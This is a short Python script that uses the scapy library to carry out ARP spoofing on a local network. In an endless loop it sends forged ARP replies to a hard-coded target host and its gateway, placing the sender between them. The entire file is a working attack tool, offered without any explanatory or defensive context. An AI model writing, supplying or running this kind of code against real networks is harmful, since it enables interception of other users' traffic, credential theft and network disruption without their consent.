from scapy.all import ARP, Ether, sendp
# need's to be run as sudo for interface priliges..
interface = "wlo1"

def perform_arp_spoofing(target_ip, gateway_ip):
    while True:
        arp_response_target = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="is-at", pdst=target_ip, psrc=gateway_ip)
        arp_response_gateway = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="is-at", pdst=gateway_ip, psrc=target_ip)

        sendp(arp_response_target, iface= interface)
        sendp(arp_response_gateway, iface=interface)

target_ip = "192.168.1.2"
gateway_ip = "192.168.1.1"

perform_arp_spoofing(target_ip, gateway_ip)